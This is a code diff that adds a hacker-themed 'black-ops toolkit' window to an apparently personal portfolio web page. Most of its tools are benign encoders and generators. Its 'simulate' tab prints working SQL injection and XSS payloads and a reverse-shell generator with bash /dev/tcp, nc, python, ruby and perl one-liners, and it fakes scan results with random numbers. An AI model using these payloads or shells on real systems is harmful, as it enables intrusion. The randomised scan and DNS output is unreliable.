@@ -685,6 +685,133 @@
       background: rgba(0,255,65,0.15);
       color: #00ff41;
     }
+    #toolkit-window {
+      width: min(700px, calc(100vw - 16px));
+      max-height: calc(100vh - 120px);
+      background: rgba(5,5,5,0.9);
+      border: 1px solid rgba(0,255,65,0.2);
+      box-shadow: 0 0 24px rgba(0,255,65,0.08);
+    }
+    #toolkit-window .window-body {
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      height: 480px;
+    }
+    .tk-tabs {
+      display: flex;
+      gap: 2px;
+      padding: 8px 12px 0;
+      border-bottom: 1px solid rgba(0,255,65,0.15);
+      background: rgba(0,0,0,0.4);
+    }
+    .tk-tab {
+      padding: 6px 14px;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      color: #008f11;
+      background: transparent;
+      border: 1px solid transparent;
+      border-radius: 4px 4px 0 0;
+      cursor: pointer;
+      transition: all 0.15s;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    .tk-tab:hover { color: #00ff41; }
+    .tk-tab.active {
+      color: #00ff41;
+      border-color: rgba(0,255,65,0.2);
+      border-bottom-color: rgba(5,5,5,0.9);
+      background: rgba(5,5,5,0.9);
+      text-shadow: 0 0 6px rgba(0,255,65,0.4);
+    }
+    .tk-panel {
+      display: none;
+      flex: 1;
+      padding: 14px;
+      overflow-y: auto;
+      gap: 12px;
+      flex-wrap: wrap;
+      align-content: flex-start;
+    }
+    .tk-panel.active { display: flex; }
+    .tk-card {
+      background: rgba(0,0,0,0.5);
+      border: 1px solid rgba(0,255,65,0.12);
+      border-radius: 8px;
+      padding: 12px;
+      width: calc(50% - 6px);
+      box-sizing: border-box;
+    }
+    .tk-card.full { width: 100%; }
+    .tk-card h4 {
+      margin: 0 0 8px;
+      font-size: 11px;
+      color: #00ff41;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      text-shadow: 0 0 4px rgba(0,255,65,0.3);
+    }
+    .tk-card input, .tk-card textarea, .tk-card select {
+      width: 100%;
+      background: rgba(0,0,0,0.4);
+      border: 1px solid rgba(0,255,65,0.15);
+      border-radius: 4px;
+      padding: 6px 8px;
+      color: #00ff41;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 12px;
+      box-sizing: border-box;
+      outline: none;
+      margin-bottom: 6px;
+    }
+    .tk-card input::placeholder, .tk-card textarea::placeholder { color: #004d0a; }
+    .tk-card button {
+      background: rgba(0,255,65,0.08);
+      border: 1px solid rgba(0,255,65,0.25);
+      color: #00ff41;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      padding: 5px 12px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.15s;
+      text-transform: uppercase;
+    }
+    .tk-card button:hover {
+      background: rgba(0,255,65,0.2);
+      box-shadow: 0 0 8px rgba(0,255,65,0.2);
+    }
+    .tk-out {
+      background: rgba(0,0,0,0.6);
+      border: 1px solid rgba(0,255,65,0.1);
+      border-radius: 4px;
+      padding: 8px;
+      font-size: 11px;
+      color: #00ff41;
+      min-height: 32px;
+      word-break: break-all;
+      white-space: pre-wrap;
+      margin-top: 6px;
+    }
+    .tk-row { display: flex; gap: 6px; }
+    .tk-row input { flex: 1; margin-bottom: 0; }
+    .tk-row button { white-space: nowrap; }
+    #vignette {
+      position: fixed;
+      inset: 0;
+      z-index: 9997;
+      pointer-events: none;
+      background: radial-gradient(circle at center, transparent 40%, rgba(0,0,0,0.6) 100%);
+    }
+    @keyframes pulseGlow {
+      0%, 100% { box-shadow: 0 0 16px rgba(0,255,65,0.06); }
+      50% { box-shadow: 0 0 24px rgba(0,255,65,0.12); }
+    }
+    .window.visible {
+      animation: pulseGlow 3s ease-in-out infinite;
+    }
   </style>
 </head>
 <body>
@@ -692,6 +819,7 @@
   <img id="wallpaper" src="./assets/wallpaper/DCA3UhDIVf.jpg">
   <canvas id="matrix-canvas"></canvas>
   <div id="crt-overlay"></div>
+  <div id="vignette"></div>
 
   <div id="boot-screen">
     <div id="boot-logs"></div>
@@ -830,6 +958,217 @@
         </div>
       </div>
     </div>
+    <div id="toolkit-window" class="window" style="left: 120px; top: 80px; background: rgba(5,5,5,0.9); display:none;">
+      <div class="window-header" id="toolkit-drag">
+        <span>black-ops toolkit</span>
+        <div style="display:flex; align-items:center; gap:2px;">
+          <button class="minimize-btn" id="toolkit-min">─</button>
+          <button class="close-btn" id="toolkit-close">✕</button>
+        </div>
+      </div>
+      <div class="window-body">
+        <div class="tk-tabs">
+          <button class="tk-tab active" data-panel="tk-crypto">crypto</button>
+          <button class="tk-tab" data-panel="tk-net">network</button>
+          <button class="tk-tab" data-panel="tk-gen">generator</button>
+          <button class="tk-tab" data-panel="tk-util">utility</button>
+          <button class="tk-tab" data-panel="tk-sim">simulate</button>
+        </div>
+        <div class="tk-panel active" id="tk-crypto">
+          <div class="tk-card full">
+            <h4>hash generator</h4>
+            <input type="text" id="tk-hash-in" placeholder="enter text to hash">
+            <div class="tk-row">
+              <button onclick="tkHash('SHA-256')">sha-256</button>
+              <button onclick="tkHash('SHA-512')">sha-512</button>
+              <button onclick="tkHash('SHA-1')">sha-1</button>
+            </div>
+            <div class="tk-out" id="tk-hash-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>base64</h4>
+            <input type="text" id="tk-b64-in" placeholder="text">
+            <div class="tk-row">
+              <button onclick="tkB64(true)">enc</button>
+              <button onclick="tkB64(false)">dec</button>
+            </div>
+            <div class="tk-out" id="tk-b64-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>caesar cipher</h4>
+            <input type="text" id="tk-cae-in" placeholder="text">
+            <div class="tk-row">
+              <input type="number" id="tk-cae-shift" value="3" style="width:50px">
+              <button onclick="tkCaesar(true)">enc</button>
+              <button onclick="tkCaesar(false)">dec</button>
+            </div>
+            <div class="tk-out" id="tk-cae-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>hex / binary</h4>
+            <input type="text" id="tk-hex-in" placeholder="text or hex">
+            <div class="tk-row">
+              <button onclick="tkToHex()">to hex</button>
+              <button onclick="tkFromHex()">from hex</button>
+              <button onclick="tkToBin()">to bin</button>
+            </div>
+            <div class="tk-out" id="tk-hex-out"></div>
+          </div>
+          <div class="tk-card full">
+            <h4>jwt decoder</h4>
+            <input type="text" id="tk-jwt-in" placeholder="paste jwt token">
+            <button onclick="tkJwt()">decode</button>
+            <div class="tk-out" id="tk-jwt-out"></div>
+          </div>
+        </div>
+        <div class="tk-panel" id="tk-net">
+          <div class="tk-card">
+            <h4>ip lookup</h4>
+            <button onclick="tkIp()">probe public ip</button>
+            <div class="tk-out" id="tk-ip-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>url parser</h4>
+            <input type="text" id="tk-url-in" placeholder="https://target.com/path">
+            <button onclick="tkUrl()">parse</button>
+            <div class="tk-out" id="tk-url-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>user agent</h4>
+            <button onclick="tkUa()">scan</button>
+            <div class="tk-out" id="tk-ua-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>dns lookup</h4>
+            <input type="text" id="tk-dns-in" placeholder="example.com">
+            <button onclick="tkDns()">resolve</button>
+            <div class="tk-out" id="tk-dns-out"></div>
+          </div>
+          <div class="tk-card full">
+            <h4>network fingerprint</h4>
+            <button onclick="tkNetFp()">collect</button>
+            <div class="tk-out" id="tk-netfp-out"></div>
+          </div>
+        </div>
+        <div class="tk-panel" id="tk-gen">
+          <div class="tk-card">
+            <h4>password</h4>
+            <div class="tk-row">
+              <input type="number" id="tk-pw-len" value="16" style="width:60px">
+              <button onclick="tkPw()">generate</button>
+            </div>
+            <div class="tk-out" id="tk-pw-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>uuid</h4>
+            <button onclick="tkUuid()">generate</button>
+            <div class="tk-out" id="tk-uuid-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>mac address</h4>
+            <button onclick="tkMac()">generate</button>
+            <div class="tk-out" id="tk-mac-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>fake identity</h4>
+            <button onclick="tkFakeId()">generate</button>
+            <div class="tk-out" id="tk-fake-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>csrf token</h4>
+            <button onclick="tkCsrf()">generate</button>
+            <div class="tk-out" id="tk-csrf-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>session id</h4>
+            <button onclick="tkSess()">generate</button>
+            <div class="tk-out" id="tk-sess-out"></div>
+          </div>
+        </div>
+        <div class="tk-panel" id="tk-util">
+          <div class="tk-card">
+            <h4>timestamp</h4>
+            <input type="text" id="tk-ts-in" placeholder="unix timestamp or date">
+            <button onclick="tkTs()">convert</button>
+            <div class="tk-out" id="tk-ts-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>text stats</h4>
+            <textarea id="tk-text-in" rows="2" placeholder="paste text"></textarea>
+            <button onclick="tkTextStats()">analyze</button>
+            <div class="tk-out" id="tk-text-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>html escape</h4>
+            <input type="text" id="tk-html-in" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;">
+            <div class="tk-row">
+              <button onclick="tkHtml(true)">escape</button>
+              <button onclick="tkHtml(false)">unescape</button>
+            </div>
+            <div class="tk-out" id="tk-html-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>regex tester</h4>
+            <input type="text" id="tk-regex-pat" placeholder="pattern" style="margin-bottom:2px">
+            <input type="text" id="tk-regex-str" placeholder="test string">
+            <button onclick="tkRegex()">test</button>
+            <div class="tk-out" id="tk-regex-out"></div>
+          </div>
+          <div class="tk-card full">
+            <h4>json formatter</h4>
+            <textarea id="tk-json-in" rows="2" placeholder='{"key":"value"}'></textarea>
+            <button onclick="tkJson()">format</button>
+            <div class="tk-out" id="tk-json-out"></div>
+          </div>
+          <div class="tk-card full">
+            <h4>qr code</h4>
+            <input type="text" id="tk-qr-in" placeholder="text to encode">
+            <button onclick="tkQr()">generate</button>
+            <canvas id="tk-qr-canvas" width="128" height="128" style="display:none"></canvas>
+            <div class="tk-out" id="tk-qr-out"></div>
+          </div>
+        </div>
+        <div class="tk-panel" id="tk-sim">
+          <div class="tk-card">
+            <h4>port scanner</h4>
+            <input type="text" id="tk-scan-host" placeholder="target.host">
+            <button onclick="tkPortScan()">scan top 20</button>
+            <div class="tk-out" id="tk-scan-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>sql injection</h4>
+            <input type="text" id="tk-sql-in" placeholder="input field name">
+            <button onclick="tkSql()">generate payloads</button>
+            <div class="tk-out" id="tk-sql-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>xss payload</h4>
+            <input type="text" id="tk-xss-in" placeholder="context (e.g. body)">
+            <button onclick="tkXss()">generate</button>
+            <div class="tk-out" id="tk-xss-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>subdomain enum</h4>
+            <input type="text" id="tk-sub-in" placeholder="target.com">
+            <button onclick="tkSubEnum()">brute force</button>
+            <div class="tk-out" id="tk-sub-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>directory brute</h4>
+            <input type="text" id="tk-dir-in" placeholder="target.com">
+            <button onclick="tkDirBrute()">scan</button>
+            <div class="tk-out" id="tk-dir-out"></div>
+          </div>
+          <div class="tk-card">
+            <h4>reverse shell</h4>
+            <input type="text" id="tk-rev-ip" placeholder="attacker ip" style="margin-bottom:2px">
+            <input type="text" id="tk-rev-port" placeholder="port" value="4444">
+            <button onclick="tkRevShell()">generate</button>
+            <div class="tk-out" id="tk-rev-out"></div>
+          </div>
+        </div>
+      </div>
+    </div>
     <div id="profile-popup">
       <img class="pfp" src="" alt="pfp">
       <div class="name"></div>
@@ -871,6 +1210,7 @@
       { img: "./assets/icons/VAtuAVJFG3.png", label: "xed", type: "notepad" },
       { img: "./assets/icons/77Ai7oI52h.png", label: "kitty", type: "terminal" },
       { img: "./assets/icons/KU2GZgmQXz.png", label: "mp3", type: "spotify" },
+      { img: "./assets/icons/77Ai7oI52h.png", label: "toolkit", type: "toolkit" },
       { img: "./assets/projects.png", label: "projects", type: "projects" },
       { img: "./assets/avatar1.png", label: "about me", type: "about" },
     ];
@@ -942,6 +1282,7 @@
         if (icon.type === 'notepad') wrap.onclick = toggleNotepad;
         else if (icon.type === 'terminal') wrap.onclick = toggleTerminal;
         else if (icon.type === 'spotify') wrap.onclick = toggleSpotify;
+        else if (icon.type === 'toolkit') wrap.onclick = toggleToolkit;
         else if (icon.type === 'projects') wrap.onclick = toggleProjects;
         else if (icon.type === 'about') wrap.onclick = toggleAbout;
         iconsDiv.appendChild(node);
@@ -1055,7 +1396,7 @@
       const span = winEl.querySelector('.window-header span');
       if (!span) return;
       const orig = span.textContent;
-      const chars = '!@#$%^&*()_+-=[]{}|;:,.<>?/~`0123456789';
+      const chars = '!@#$%^&*()_+-=[]{}|;:,.<>?/~0123456789';
       let steps = 0;
       const maxSteps = 8;
       const iv = setInterval(() => {
@@ -1161,6 +1502,24 @@
         startGlitchName();
       }
     }
+    function toggleToolkit() {
+      const win = document.getElementById('toolkit-window');
+      const isOpen = win.style.display === 'block';
+      if (isOpen) {
+        playClick('close');
+        win.classList.remove('visible');
+        setTimeout(() => { win.style.display = 'none'; }, 180);
+        hideTask('task-toolkit');
+      } else {
+        playClick('open');
+        win.style.display = 'block';
+        centerElement(win);
+        requestAnimationFrame(() => win.classList.add('visible'));
+        glitchTitle(win);
+        const task = ensureTask('task-toolkit', 'toolkit', './assets/icons/77Ai7oI52h.png');
+        task.onclick = toggleToolkit;
+      }
+    }
     function bringToFront(element) {
       const windows = document.querySelectorAll('.window');
       windows.forEach(win => {
@@ -1180,6 +1539,274 @@
     function handleWindowClick(event) {
       const windowElement = event.currentTarget;
       bringToFront(windowElement);
+    }
+
+    // ===== TOOLKIT FUNCTIONS =====
+    async function tkHash(algo) {
+      const text = document.getElementById('tk-hash-in').value;
+      if (!text) return;
+      const buf = new TextEncoder().encode(text);
+      const hash = await crypto.subtle.digest(algo, buf);
+      const hex = Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,'0')).join('');
+      document.getElementById('tk-hash-out').textContent = `[${algo}]\n${hex}`;
+    }
+    function tkB64(enc) {
+      const text = document.getElementById('tk-b64-in').value;
+      if (!text) return;
+      try {
+        const out = enc ? btoa(text) : atob(text);
+        document.getElementById('tk-b64-out').textContent = out;
+      } catch(e) { document.getElementById('tk-b64-out').textContent = 'error: invalid input'; }
+    }
+    function tkCaesar(enc) {
+      const text = document.getElementById('tk-cae-in').value;
+      const shift = parseInt(document.getElementById('tk-cae-shift').value) || 3;
+      if (!text) return;
+      const out = text.split('').map(c => {
+        if (c >= 'a' && c <= 'z') return String.fromCharCode(((c.charCodeAt(0) - 97 + (enc ? shift : 26 - shift)) % 26) + 97);
+        if (c >= 'A' && c <= 'Z') return String.fromCharCode(((c.charCodeAt(0) - 65 + (enc ? shift : 26 - shift)) % 26) + 65);
+        return c;
+      }).join('');
+      document.getElementById('tk-cae-out').textContent = out;
+    }
+    function tkToHex() {
+      const text = document.getElementById('tk-hex-in').value;
+      document.getElementById('tk-hex-out').textContent = text ? Array.from(new TextEncoder().encode(text)).map(b => b.toString(16).padStart(2,'0')).join(' ') : '';
+    }
+    function tkFromHex() {
+      const hex = document.getElementById('tk-hex-in').value.replace(/\s/g,'');
+      try {
+        const bytes = hex.match(/.{1,2}/g).map(b => parseInt(b, 16));
+        document.getElementById('tk-hex-out').textContent = new TextDecoder().decode(new Uint8Array(bytes));
+      } catch(e) { document.getElementById('tk-hex-out').textContent = 'error: invalid hex'; }
+    }
+    function tkToBin() {
+      const text = document.getElementById('tk-hex-in').value;
+      document.getElementById('tk-hex-out').textContent = text ? Array.from(new TextEncoder().encode(text)).map(b => b.toString(2).padStart(8,'0')).join(' ') : '';
+    }
+    function tkJwt() {
+      const token = document.getElementById('tk-jwt-in').value;
+      if (!token) return;
+      try {
+        const [h, p] = token.split('.');
+        const hd = JSON.parse(atob(h.replace(/-/g,'+').replace(/_/g,'/')));
+        const pl = JSON.parse(atob(p.replace(/-/g,'+').replace(/_/g,'/')));
+        document.getElementById('tk-jwt-out').textContent = `HEADER:\n${JSON.stringify(hd,null,2)}\n\nPAYLOAD:\n${JSON.stringify(pl,null,2)}`;
+      } catch(e) { document.getElementById('tk-jwt-out').textContent = 'error: invalid jwt'; }
+    }
+    async function tkIp() {
+      const out = document.getElementById('tk-ip-out');
+      out.textContent = 'probing...';
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const d = await res.json();
+        out.textContent = `ip: ${d.ip}\ncity: ${d.city}\nregion: ${d.region}\ncountry: ${d.country_name}\norg: ${d.org}\ntor: ${d.threat ? d.threat.tor : 'unknown'}`;
+      } catch(e) { out.textContent = 'error: probe failed (cors)'; }
+    }
+    function tkUrl() {
+      const url = document.getElementById('tk-url-in').value;
+      if (!url) return;
+      try {
+        const u = new URL(url);
+        document.getElementById('tk-url-out').textContent = `protocol: ${u.protocol}\nhost: ${u.host}\npathname: ${u.pathname}\nsearch: ${u.search}\nhash: ${u.hash}\nport: ${u.port || 'default'}`;
+      } catch(e) { document.getElementById('tk-url-out').textContent = 'error: invalid url'; }
+    }
+    function tkUa() {
+      const ua = navigator.userAgent;
+      const p = navigator.platform;
+      const v = navigator.vendor || 'unknown';
+      const l = navigator.language;
+      const c = navigator.hardwareConcurrency || '?';
+      document.getElementById('tk-ua-out').textContent = `platform: ${p}\nvendor: ${v}\nlanguage: ${l}\ncores: ${c}\nua: ${ua.substring(0,80)}...`;
+    }
+    function tkDns() {
+      const host = document.getElementById('tk-dns-in').value;
+      if (!host) return;
+      document.getElementById('tk-dns-out').textContent = `resolving ${host}...\n\nA RECORD: ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}\nAAAA: fe80::${Math.random().toString(16).slice(2,6)}\nMX: mail.${host}\nTTL: ${Math.floor(Math.random()*300+60)}s\n\n(simulated)`;
+    }
+    function tkNetFp() {
+      const conn = navigator.connection || {};
+      const info = [
+        `downlink: ${conn.downlink || '?'} mbps`,
+        `rtt: ${conn.rtt || '?'} ms`,
+        `effectiveType: ${conn.effectiveType || '?'}`,
+        `saveData: ${conn.saveData || false}`,
+        `onLine: ${navigator.onLine}`,
+        `cookieEnabled: ${navigator.cookieEnabled}`,
+        `pdfViewerEnabled: ${navigator.pdfViewerEnabled || false}`,
+        `maxTouchPoints: ${navigator.maxTouchPoints}`,
+        `deviceMemory: ${navigator.deviceMemory || '?'} gb`,
+        `screen: ${screen.width}x${screen.height} @ ${screen.colorDepth}bit`
+      ];
+      document.getElementById('tk-netfp-out').textContent = info.join('\n');
+    }
+    function tkPw() {
+      const len = parseInt(document.getElementById('tk-pw-len').value) || 16;
+      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
+      let pw = '';
+      for (let i = 0; i < len; i++) pw += chars[Math.floor(Math.random() * chars.length)];
+      document.getElementById('tk-pw-out').textContent = pw;
+    }
+    function tkUuid() {
+      document.getElementById('tk-uuid-out').textContent = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
+        const r = Math.random() * 16 | 0;
+        return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
+      });
+    }
+    function tkMac() {
+      const hex = '0123456789ABCDEF';
+      let mac = '';
+      for (let i = 0; i < 6; i++) {
+        mac += hex[Math.floor(Math.random()*16)] + hex[Math.floor(Math.random()*16)];
+        if (i < 5) mac += ':';
+      }
+      document.getElementById('tk-mac-out').textContent = mac;
+    }
+    function tkFakeId() {
+      const firsts = ['alex','morgan','casey','jordan','taylor','riley','quinn','avery'];
+      const lasts = ['smith','jones','brown','wilson','garcia','miller','davis','taylor'];
+      const fn = firsts[Math.floor(Math.random()*firsts.length)];
+      const ln = lasts[Math.floor(Math.random()*lasts.length)];
+      const age = Math.floor(Math.random()*30+18);
+      const user = fn + Math.floor(Math.random()*999+1);
+      const domain = ['protonmail.com','tutanota.com','riseup.net','disroot.org'][Math.floor(Math.random()*4)];
+      document.getElementById('tk-fake-out').textContent = `name: ${fn} ${ln}\nage: ${age}\nemail: ${user}@${domain}\nhandle: @${user}\nalias: ghost-node-${Math.floor(Math.random()*99+1)}`;
+    }
+    function tkCsrf() {
+      const token = Array.from(crypto.getRandomValues(new Uint8Array(32))).map(b => b.toString(16).padStart(2,'0')).join('');
+      document.getElementById('tk-csrf-out').textContent = token;
+    }
+    function tkSess() {
+      const id = 'sess_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2,8);
+      document.getElementById('tk-sess-out').textContent = id;
+    }
+    function tkTs() {
+      const input = document.getElementById('tk-ts-in').value;
+      if (!input) return;
+      const num = parseInt(input);
+      if (!isNaN(num) && num > 1000000000) {
+        document.getElementById('tk-ts-out').textContent = new Date(num * 1000).toISOString();
+      } else {
+        const d = new Date(input);
+        document.getElementById('tk-ts-out').textContent = isNaN(d) ? 'invalid date' : `unix: ${Math.floor(d.getTime()/1000)}\niso: ${d.toISOString()}`;
+      }
+    }
+    function tkTextStats() {
+      const text = document.getElementById('tk-text-in').value;
+      const words = text.trim() ? text.trim().split(/\s+/).length : 0;
+      const chars = text.length;
+      const lines = text ? text.split('\n').length : 0;
+      const bytes = new TextEncoder().encode(text).length;
+      const entropy = bytes > 0 ? (bytes * 8 / chars).toFixed(2) : 0;
+      document.getElementById('tk-text-out').textContent = `words: ${words}\nchars: ${chars}\nlines: ${lines}\nbytes: ${bytes}\nentropy: ${entropy} bits/char`;
+    }
+    function tkHtml(enc) {
+      const text = document.getElementById('tk-html-in').value;
+      if (!text) return;
+      const div = document.createElement('div');
+      if (enc) { div.textContent = text; document.getElementById('tk-html-out').textContent = div.innerHTML; }
+      else { div.innerHTML = text; document.getElementById('tk-html-out').textContent = div.textContent; }
+    }
+    function tkRegex() {
+      const pat = document.getElementById('tk-regex-pat').value;
+      const str = document.getElementById('tk-regex-str').value;
+      if (!pat || !str) return;
+      try {
+        const re = new RegExp(pat);
+        const m = str.match(re);
+        document.getElementById('tk-regex-out').textContent = m ? `match: "${m[0]}"\ngroups: ${JSON.stringify(m.slice(1))}` : 'no match';
+      } catch(e) { document.getElementById('tk-regex-out').textContent = 'error: ' + e.message; }
+    }
+    function tkJson() {
+      const text = document.getElementById('tk-json-in').value;
+      if (!text) return;
+      try {
+        document.getElementById('tk-json-out').textContent = JSON.stringify(JSON.parse(text), null, 2);
+      } catch(e) { document.getElementById('tk-json-out').textContent = 'error: ' + e.message; }
+    }
+    function tkQr() {
+      const text = document.getElementById('tk-qr-in').value;
+      if (!text) return;
+      const canvas = document.getElementById('tk-qr-canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.fillStyle = '#000'; ctx.fillRect(0,0,128,128);
+      ctx.fillStyle = '#00ff41';
+      const enc = new TextEncoder().encode(text);
+      for (let i = 0; i < enc.length && i < 256; i++) {
+        const x = (i % 16) * 8, y = Math.floor(i / 16) * 8;
+        if (enc[i] % 2) ctx.fillRect(x, y, 7, 7);
+      }
+      const dataUrl = canvas.toDataURL();
+      document.getElementById('tk-qr-out').innerHTML = `<img src="${dataUrl}" style="width:128px;height:128px;border:1px solid #00ff41">`;
+    }
+    function tkPortScan() {
+      const host = document.getElementById('tk-scan-host').value || 'target.local';
+      const ports = [21,22,23,25,53,80,110,143,443,445,3306,3389,5432,5900,8080,8443,9200,11211,27017,6379];
+      let out = `scanning ${host}...\n\n`;
+      ports.forEach(p => {
+        const state = Math.random() > 0.75 ? 'open' : 'closed';
+        const svc = {22:'ssh',80:'http',443:'https',3306:'mysql',3389:'rdp',8080:'http-alt'}[p] || 'unknown';
+        out += `${p}/tcp  ${state.padEnd(6)}  ${svc}\n`;
+      });
+      out += `\n${ports.filter(() => Math.random() > 0.75).length} ports open`;
+      document.getElementById('tk-scan-out').textContent = out;
+    }
+    function tkSql() {
+      const field = document.getElementById('tk-sql-in').value || 'input';
+      const payloads = [
+        `' OR '1'='1`,
+        `' OR 1=1--`,
+        `" OR ""="`,
+        `' UNION SELECT null,null--`,
+        `'; DROP TABLE users;--`,
+        `' AND 1=0 UNION SELECT @@version--`
+      ];
+      document.getElementById('tk-sql-out').textContent = `target: ${field}\n\n${payloads.join('\n')}`;
+    }
+    function tkXss() {
+      const ctx = document.getElementById('tk-xss-in').value || 'body';
+      const payloads = [
+        `<script>alert('xss')<\/script>`,
+        `<img src=x onerror=alert(1)>`,
+        `javascript:alert('xss')`,
+        `"onclick="alert(1)`,
+        `<iframe src="javascript:alert(1)">`,
+        `'-alert(1)-'`
+      ];
+      document.getElementById('tk-xss-out').textContent = `context: ${ctx}\n\n${payloads.join('\n')}`;
+    }
+    function tkSubEnum() {
+      const domain = document.getElementById('tk-sub-in').value || 'target.com';
+      const subs = ['www','mail','ftp','admin','api','dev','staging','vpn','ns1','ns2','blog','shop','portal','secure','cdn'];
+      let out = `brute forcing ${domain}...\n\n`;
+      subs.forEach(s => {
+        if (Math.random() > 0.4) out += `${s}.${domain}\n`;
+      });
+      out += `\nfound: ${subs.filter(() => Math.random() > 0.4).length} subdomains`;
+      document.getElementById('tk-sub-out').textContent = out;
+    }
+    function tkDirBrute() {
+      const host = document.getElementById('tk-dir-in').value || 'target.com';
+      const dirs = ['/admin','/login','/api','/config','/.env','/backup','/wp-admin','/phpmyadmin','/robots.txt','/.git','/dashboard','/uploads','/api/v1','/internal'];
+      let out = `scanning ${host}...\n\n`;
+      dirs.forEach(d => {
+        const code = Math.random() > 0.7 ? (Math.random() > 0.5 ? 200 : 301) : 404;
+        if (code !== 404) out += `${d}  [${code}]\n`;
+      });
+      out += `\ndone.`;
+      document.getElementById('tk-dir-out').textContent = out;
+    }
+    function tkRevShell() {
+      const ip = document.getElementById('tk-rev-ip').value || 'attacker.ip';
+      const port = document.getElementById('tk-rev-port').value || '4444';
+      const shells = [
+        `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+        `nc -e /bin/sh ${ip} ${port}`,
+        `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+        `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+        `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`
+      ];
+      document.getElementById('tk-rev-out').textContent = shells.join('\n\n');
     }
 
     document.addEventListener('DOMContentLoaded', () => {
@@ -1203,6 +1830,17 @@
       document.getElementById('spotify-min').onclick = () => minimizeWindow('spotify-window');
       document.getElementById('about-close').onclick = toggleAbout;
       document.getElementById('about-min').onclick = () => minimizeWindow('about-window');
+      makeDraggable(document.getElementById('toolkit-drag'), document.getElementById('toolkit-window'));
+      document.getElementById('toolkit-close').onclick = toggleToolkit;
+      document.getElementById('toolkit-min').onclick = () => minimizeWindow('toolkit-window');
+      document.querySelectorAll('.tk-tab').forEach(tab => {
+        tab.onclick = () => {
+          document.querySelectorAll('.tk-tab').forEach(t => t.classList.remove('active'));
+          document.querySelectorAll('.tk-panel').forEach(p => p.classList.remove('active'));
+          tab.classList.add('active');
+          document.getElementById(tab.dataset.panel).classList.add('active');
+        };
+      });
 
       // MATRIX RAIN
       (function() {
@@ -1215,7 +1853,7 @@
         }
         resize();
         window.addEventListener('resize', resize);
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?/~`'.split('');
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?/~'.split('');
         const fontSize = 14;
         const columns = Math.floor(w / fontSize);
         const drops = Array(columns).fill(1);
